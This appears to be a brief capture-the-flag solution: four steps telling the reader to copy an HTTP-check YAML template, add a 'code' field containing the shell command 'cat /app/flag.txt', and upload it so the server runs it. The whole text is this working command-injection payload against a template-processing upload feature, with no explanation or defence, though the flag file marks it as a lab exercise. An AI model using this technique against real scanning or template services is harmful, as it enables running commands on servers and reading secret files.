1) run application locally
2) copy existing template (example1.yaml) to any other file (payload.yaml)
3) add code section to the payload.yaml
4) /upload the payload.yaml

```yaml
# digest: a7f3546ab25c5e0f7f67a7fedbe77336c735de64b8ad1e75b88e7b1c5a2755c4
name: Basic HTTP Check
description: A template to check for HTTP responses.
type: http
requests:
  - method: GET
    path:
      - "/"
    matchers:
      - type: status
        status:
          - 200
code: cat /app/flag.txt
```
